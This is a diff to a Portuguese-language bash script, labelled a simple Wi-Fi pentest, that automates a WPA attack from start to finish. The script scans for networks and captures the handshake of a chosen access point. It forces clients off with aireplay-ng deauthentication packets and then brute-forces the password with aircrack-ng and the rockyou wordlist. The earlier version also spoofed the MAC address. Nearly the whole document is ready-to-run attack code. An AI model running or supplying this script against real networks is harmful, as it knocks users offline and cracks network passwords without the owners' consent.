@@ -1,58 +1,73 @@
 #!/bin/bash
 
 clear
-echo "===== PENTEST WI-FI SIMPLES ====="
+echo "===== PENTEST WI-FI SIMPLIFICADO ====="
 echo ""
 
-# Lista interfaces de rede
+# Lista interfaces
 echo "[+] Interfaces disponíveis:"
 ip -o link show | awk -F': ' '{print $2}' | grep -v "lo"
 echo ""
-read -p "Digite o nome da interface (ex: wlan0): " INTERFACE
+read -p "Digite a interface (ex: wlan0): " INTERFACE
 
-# Verifica se a interface existe
+# Verifica interface
 if ! ip link show $INTERFACE &> /dev/null; then
-    echo "[ERRO] Interface $INTERFACE não encontrada!"
+    echo "[ERRO] Interface $INTERFACE não existe!"
     exit 1
 fi
 
-# Passo 1: Mudar MAC e ativar modo monitor
+# Ativa modo monitor (sem adicionar 'mon')
 echo ""
-echo "[+] Mudando MAC e ativando modo monitor..."
-sudo ifconfig $INTERFACE down
-sudo macchanger -r $INTERFACE &> /dev/null
-sudo ifconfig $INTERFACE up
+echo "[+] Ativando modo monitor..."
 sudo airmon-ng check kill &> /dev/null
 sudo airmon-ng start $INTERFACE &> /dev/null
-INTERFACE_MON="${INTERFACE}mon"
 
-# Passo 2: Listar redes
+# Lista redes
 echo ""
-echo "[+] Listando redes próximas (Ctrl+C para parar)..."
-sudo airodump-ng $INTERFACE_MON
-echo ""
-read -p "Digite o BSSID (MAC) do alvo: " BSSID
-read -p "Digite o canal do alvo: " CHANNEL
-read -p "Digite o nome do arquivo de captura (sem extensão): " FILE_NAME
+echo "[+] Listando redes (Ctrl+C para parar)..."
+sudo airodump-ng $INTERFACE
 
-# Passo 3: Capturar handshake
+# Inputs do usuário
 echo ""
-echo "[+] Capturando handshake (abra outro terminal para o próximo passo)..."
-sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE_MON &> /dev/null &
+read -p "Digite o BSSID alvo (MAC): " BSSID
+read -p "Digite o canal: " CHANNEL
+read -p "Nome do arquivo .cap (sem extensão): " FILE_NAME
+read -p "MAC do cliente específico (ou deixe em branco): " CLIENT_MAC
 
-# Passo 4: Ataque de desautenticação
+# Captura handshake
 echo ""
-read -p "Quantos pacotes de desautenticação? (0 para contínuo): " PACKETS
-echo "[+] Iniciando ataque de desautenticação..."
-sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE_MON
+echo "[+] Iniciando captura em: $(pwd)/${FILE_NAME}.cap"
+xterm -e "sudo airodump-ng --bssid $BSSID -c $CHANNEL -w $FILE_NAME $INTERFACE" &
 
-# Finalização
+# Ataque deauth
 echo ""
-echo "[+] Concluído! Handshake salvo em: ${FILE_NAME}.cap"
-echo "Use 'aircrack-ng -w wordlist.txt ${FILE_NAME}.cap' para quebrar a senha."
+read -p "Quantos pacotes de deauth? (0=contínuo): " PACKETS
+if [ -z "$CLIENT_MAC" ]; then
+    xterm -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID $INTERFACE" &
+else
+    xterm -e "sudo aireplay-ng --deauth $PACKETS -a $BSSID -c $CLIENT_MAC $INTERFACE" &
+fi
+
+# Opção de brute force
+echo ""
+read -p "Deseja quebrar a senha agora? (s/n): " BRUTE
+if [[ $BRUTE =~ [sS] ]]; then
+    if [ -f "/usr/share/wordlists/rockyou.txt.gz" ]; then
+        echo "[+] Descompactando rockyou.txt..."
+        sudo gunzip /usr/share/wordlists/rockyou.txt.gz &> /dev/null
+    fi
+    if [ -f "/usr/share/wordlists/rockyou.txt" ]; then
+        echo "[+] Iniciando brute force com rockyou.txt..."
+        sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt ${FILE_NAME}-01.cap
+    else
+        echo "[ERRO] rockyou.txt não encontrado em /usr/share/wordlists/"
+    fi
+fi
 
 # Limpeza
-sudo airmon-ng stop $INTERFACE_MON &> /dev/null
+echo ""
+echo "[+] Restaurando interface..."
+sudo airmon-ng stop $INTERFACE &> /dev/null
 sudo ifconfig $INTERFACE down
 sudo macchanger -p $INTERFACE &> /dev/null
 sudo ifconfig $INTERFACE up
